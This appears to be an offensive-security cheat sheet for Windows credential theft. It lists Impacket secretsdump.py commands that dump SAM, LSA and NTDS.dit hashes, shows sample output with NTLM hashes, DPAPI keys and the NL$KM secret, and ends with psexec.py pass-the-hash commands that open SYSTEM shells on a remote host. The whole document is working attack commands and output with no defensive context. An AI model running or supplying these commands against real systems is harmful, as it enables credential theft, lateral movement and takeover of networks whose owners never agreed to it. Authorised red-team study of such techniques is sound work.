# Secretsdump
```
secretsdump.py -dc-ip 192.168.1.9 acme.xyz/Eran.Martina@192.168.1.9


secretsdump.py acme.corp/svc_veracrypt@10.10.12.5 -use-vss -exec-method wmiexec

secretsdump.py acme.corp/svc_datakeeper@10.10.12.5 -use-vss -exec-method Winrm



secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save acme.corp/svc_sqlt@192.168.1.1
secretsdump.py -system system -ntds ntds.dit LOCAL
secretsdump.py -system system -ntds ntds.dit LOCAL > hashes.txt
secretsdump.py -system system -ntds ntds.dit -hashes lmhash:lmhash LOCAL -outputfile ntlm-extract
secretsdump.py -system system -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract


secretsdump.py -sam samantha.txt -system systemic.txt -security security.txt LOCAL 
Impacket v0.12.0.dev1+20240301.75859.fa59178 - Copyright 2023 Fortra

[*] Target system bootKey: 0xafcb5af00eadfdaffc70bf60ef7a917b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c3e856f452d9cecc5801a954ab22122:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b27afbdf9dca0fe715dc999ad4832c6:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x4e403f342a3b860481df818e69f4443c4a7c77ea
dpapi_userkey:0x496e829360963ff284f67b2c1e32e0fe1186703e
[*] NL$KM 
 0000   2C AE 58 B1 26 43 47 C3  F2 6B 37 6E B7 E6 36 D4   ,.X.&CG..k7n..6.
 0010   E4 2C 27 98 86 3F FF 29  DB DD CF 1E 36 D9 A9 20   .,'..?.)....6.. 
 0020   0B 23 69 6C 53 2F 20 C1  38 C4 85 6F DE 01 A6 91   .#ilS/ .8..o....
 0030   0E EF 7D F7 C2 FB 54 94  4C 87 7F F5 E0 31 9A DE   ..}...T.L....1..
NL$KM:2cae58b1264347c3f26b376eb7e636d4e42c2798863fff29dbddcf1e36d9a9200b23696c532f20c138c4856fde01a6910eef7df7c2fb54944c877ff5e0319ade
[*] Cleaning up... 




psexec.py Administrator@192.168.245.140 -hashes aad3b435b51404eeaad3b435b51404ee:5c3e856f452d9cecc5801a954ab22122
Impacket v0.12.0.dev1+20240301.75859.fa59178 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.245.140.....
[*] Found writable share ADMIN$
[*] Uploading file RyCEoTNq.exe
[*] Opening SVCManager on 192.168.245.140.....
[*] Creating service smJN on 192.168.245.140.....
[*] Starting service smJN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>





psexec.py Administrator@192.168.245.140 powershell -hashes aad3b435b51404eeaad3b435b51404ee:5c3e856f452d9cecc5801a954ab22122 
Impacket v0.12.0.dev1+20240301.75859.fa59178 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.245.140.....
[*] Found writable share ADMIN$
[*] Uploading file IZUlxhcQ.exe
[*] Opening SVCManager on 192.168.245.140.....
[*] Creating service qspm on 192.168.245.140.....
[*] Starting service qspm.....
[!] Press help for extra shell commands
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Windows\system32> 




```